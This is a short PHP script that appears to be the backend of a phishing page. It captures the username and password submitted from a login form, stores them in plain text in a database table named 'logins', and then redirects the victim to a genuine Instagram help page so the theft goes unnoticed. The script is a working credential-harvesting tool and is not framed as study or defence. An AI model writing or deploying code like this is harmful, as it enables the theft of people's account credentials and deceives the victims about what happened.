<?php
// Database credentials
$servername = "your_server_name";
$username = "your_user_name";
$password = "your_password";
$dbname = "your_database_name";

// Create database connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check for connection error
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if POST request has been made
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitize and store input
    $user = isset($_POST['uname']) ? trim($_POST['uname']) : '';
    $pass = isset($_POST['passwd']) ? trim($_POST['passwd']) : '';

    // Check if both fields are filled
    if (!empty($user) && !empty($pass)) {
        // Prepare SQL statement, replace "logins" to your table name
        $stmt = $conn->prepare("INSERT INTO logins (username, password) VALUES (?, ?)");
        $stmt->bind_param("ss", $user, $pass);

        if ($stmt->execute()) {
            // Redirect on success: this could be redirected to any link of desire
            header("Location: https://help.instagram.com/165828726894770");
            exit();
        } else {
            echo "Error: " . $stmt->error;
        }

        $stmt->close();
    } else {
        echo "Username and Password cannot be empty.";
    }
}

$conn->close();
?>
